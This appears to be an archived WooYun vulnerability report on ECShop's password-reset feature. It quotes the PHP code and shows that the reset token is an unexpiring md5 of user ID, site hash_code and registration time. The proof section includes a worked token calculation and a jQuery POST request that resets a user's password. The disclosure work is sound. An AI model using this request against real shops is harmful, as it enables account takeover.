@@ -1,0 +1,299 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		ecshop找回密码功能存在安全隐患  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		ecshop找回密码功能存在安全隐患  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/ksc">ksc</a> 
+</li><li>提交时间：		2014-02-17 11:11</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-02-17：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-02-17：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-02-20：	细节向第三方安全合作伙伴开放<br/>
+									2014-02-27：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-03-09：	细节向普通白帽子公开<br/>
+									2014-03-29：	细节向实习白帽子公开<br/>
+									2014-05-18：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">可能随时都能重置用户密码问题</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">user.php 740行<br />
+<br />
+</p><pre><code>/* 修改会员密码 */<br />
+elseif ($action == &#039;act_edit_password&#039;)<br />
+{<br />
+    include_once(ROOT_PATH . &#039;includes/lib_passport.php&#039;);<br />
+<br />
+    $old_password = isset($_POST[&#039;old_password&#039;]) ? trim($_POST[&#039;old_password&#039;]) : null;<br />
+    $new_password = isset($_POST[&#039;new_password&#039;]) ? trim($_POST[&#039;new_password&#039;]) : &#039;&#039;;<br />
+    $user_id      = isset($_POST[&#039;uid&#039;])  ? intval($_POST[&#039;uid&#039;]) : $user_id;<br />
+    $code         = isset($_POST[&#039;code&#039;]) ? trim($_POST[&#039;code&#039;])  : &#039;&#039;;<br />
+<br />
+    if (strlen($new_password) &lt; 6)<br />
+    {<br />
+        show_message($_LANG[&#039;passport_js&#039;][&#039;password_shorter&#039;]);<br />
+    }<br />
+<br />
+    $user_info = $user-&gt;get_profile_by_id($user_id); //论坛记录<br />
+<br />
+    if (($user_info &amp;&amp; (!empty($code) &amp;&amp; md5($user_info[&#039;user_id&#039;] . $_CFG[&#039;hash_code&#039;] . $user_info[&#039;reg_time&#039;]) == $code)) || ($_SESSION[&#039;user_id&#039;]&gt;0 &amp;&amp; $_SESSION[&#039;user_id&#039;] == $user_id &amp;&amp; $user-&gt;check_user($_SESSION[&#039;user_name&#039;], $old_password)))<br />
+    {<br />
+		<br />
+        if ($user-&gt;edit_user(array(&#039;username&#039;=&gt; (empty($code) ? $_SESSION[&#039;user_name&#039;] : $user_info[&#039;user_name&#039;]), &#039;old_password&#039;=&gt;$old_password, &#039;password&#039;=&gt;$new_password), empty($code) ? 0 : 1))<br />
+        {<br />
+			$sql=&quot;UPDATE &quot;.$ecs-&gt;table(&#039;users&#039;). &quot;SET `ec_salt`=&#039;0&#039; WHERE user_id= &#039;&quot;.$user_id.&quot;&#039;&quot;;<br />
+			$db-&gt;query($sql);<br />
+            $user-&gt;logout();<br />
+            show_message($_LANG[&#039;edit_password_success&#039;], $_LANG[&#039;relogin_lnk&#039;], &#039;user.php?act=login&#039;, &#039;info&#039;);<br />
+        }<br />
+        else<br />
+        {<br />
+            show_message($_LANG[&#039;edit_password_failure&#039;], $_LANG[&#039;back_page_up&#039;], &#039;&#039;, &#039;info&#039;);<br />
+        }<br />
+    }<br />
+    else<br />
+    {<br />
+        show_message($_LANG[&#039;edit_password_failure&#039;], $_LANG[&#039;back_page_up&#039;], &#039;&#039;, &#039;info&#039;);<br />
+    }<br />
+<br />
+}</code></pre><p class='detail'><br />
+<br />
+上面是修改密码的相关代码 <br />
+<br />
+这里需要三个参数$new_password,$user_id,$code <br />
+<br />
+而$code是怎么生成的呢<br />
+<br />
+看下面<br />
+<br />
+user.php 696行<br />
+<br />
+</p><pre><code>/* 发送密码修改确认邮件 */<br />
+elseif ($action == &#039;send_pwd_email&#039;)<br />
+{<br />
+    include_once(ROOT_PATH . &#039;includes/lib_passport.php&#039;);<br />
+<br />
+    /* 初始化会员用户名和邮件地址 */<br />
+    $user_name = !empty($_POST[&#039;user_name&#039;]) ? trim($_POST[&#039;user_name&#039;]) : &#039;&#039;;<br />
+    $email     = !empty($_POST[&#039;email&#039;])     ? trim($_POST[&#039;email&#039;])     : &#039;&#039;;<br />
+<br />
+    //用户名和邮件地址是否匹配<br />
+    $user_info = $user-&gt;get_user_info($user_name);<br />
+<br />
+    if ($user_info &amp;&amp; $user_info[&#039;email&#039;] == $email)<br />
+    {<br />
+        //生成code<br />
+         //$code = md5($user_info[0] . $user_info[1]);<br />
+<br />
+        $code = md5($user_info[&#039;user_id&#039;] . $_CFG[&#039;hash_code&#039;] . $user_info[&#039;reg_time&#039;]);<br />
+        //发送邮件的函数<br />
+        if (send_pwd_email($user_info[&#039;user_id&#039;], $user_name, $email, $code))<br />
+        {<br />
+            show_message($_LANG[&#039;send_success&#039;] . $email, $_LANG[&#039;back_home_lnk&#039;], &#039;./&#039;, &#039;info&#039;);<br />
+        }<br />
+        else<br />
+        {<br />
+            //发送邮件出错<br />
+            show_message($_LANG[&#039;fail_send_password&#039;], $_LANG[&#039;back_page_up&#039;], &#039;./&#039;, &#039;info&#039;);<br />
+        }<br />
+    }<br />
+    else<br />
+    {<br />
+        //用户名与邮件地址不匹配<br />
+        show_message($_LANG[&#039;username_no_email&#039;], $_LANG[&#039;back_page_up&#039;], &#039;&#039;, &#039;info&#039;);<br />
+    }<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+在上面可以看到 <br />
+<br />
+$code = md5($user_info[&#039;user_id&#039;] . $_CFG[&#039;hash_code&#039;] . $user_info[&#039;reg_time&#039;]);<br />
+<br />
+若网站曾被拖过库这些信息早就泄露了 而 hash_code ，reg_time基本是不会变的<br />
+<br />
+<br />
+<br />
+关键是这个code不会过期啊<br />
+<br />
+若用户使用找回密码功能 而系统发送邮件 把<br />
+<br />
+链接发送给用户<br />
+<br />
+http://www.shop.com/user.php?act=get_password&amp;uid=1324&amp;code=3167b5411485e5e34daf22d034ae78bb<br />
+<br />
+这个链接若被泄漏了<br />
+<br />
+就相当于有把备用钥匙 随时都能重置用户密码 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">$code=md5($user_info[&#039;user_id&#039;] . $_CFG[&#039;hash_code&#039;] . $user_info[&#039;reg_time&#039;]) <br />
+<br />
+<br />
+<br />
+&#039;hash_code&#039; =&gt; &#039;316589*********&#039;,<br />
+<br />
+验证 <br />
+<br />
+ uname:zhangsan uid:1324 reg_time=1384847207<br />
+<br />
+<br />
+<br />
+code=md5(1324316589*********1384847207)<br />
+<br />
+code: 58c72b3ee37**5b798857f19b<br />
+<br />
+ <br />
+<br />
+<br />
+<br />
+<br />
+<br />
+</p><pre><code>$.post(&#039;user.php?act=act_edit_password&#039;,{&#039;new_password&#039;:&#039;abc123ff&#039;,uid:1324 ,code:&#039;58c72b3ee37**5b798857f19b&#039;},<br />
+    function(data){<br />
+        <br />
+});</code></pre><p class='detail'> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">$code 中加入时间 要过期的 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/ksc" title="ksc">ksc</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-050915" title="ecshop找回密码功能存在安全隐患">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：3 </p>
+													<p class="detail">确认时间：2014-02-17 11:48</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您为shopex信息安全做的贡献<br />
+我们将尽快修复<br />
+非常感谢</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="50915";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
